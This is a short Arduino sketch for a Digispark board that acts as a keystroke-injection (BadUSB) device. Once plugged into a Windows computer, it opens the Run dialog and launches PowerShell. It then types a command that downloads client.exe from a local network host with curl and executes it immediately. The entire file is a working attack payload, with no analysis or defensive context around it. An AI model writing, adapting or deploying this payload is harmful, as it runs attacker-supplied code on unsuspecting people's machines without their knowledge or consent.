#include "DigiKeyboard.h"

#define DELAY 2000

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.print("curl -o client.exe http://192.168.29.100:8000/; .\\client.exe");
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  
}